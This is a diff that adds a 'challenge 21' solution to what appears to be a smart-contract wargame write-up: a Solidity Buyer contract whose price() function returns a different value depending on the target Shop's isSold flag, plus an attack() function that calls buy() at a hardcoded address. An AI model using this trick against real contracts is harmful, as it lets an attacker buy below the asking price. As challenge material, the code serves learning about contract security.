@@ -179,3 +179,37 @@ contract Partner {
   }
 }
 ```
+
+### challenge 21
+
+
+```
+pragma solidity ^0.6.0;
+
+contract Shop {
+  bool public isSold;
+
+  function buy() external {}
+}
+
+contract Buyer {
+  Shop _shop = Shop(0x6F818c393e11624BcBCC6eAe4144fbd1235eA212);
+
+  function price() external view returns (uint) {
+    bool _isSold = _shop.isSold();
+
+    if (_isSold) {
+      return 33;
+    }
+    if (!_isSold) {
+      return 120;
+    }
+    
+  }
+  
+  function attack() public {
+    _shop.buy();
+  }
+}
+```
+
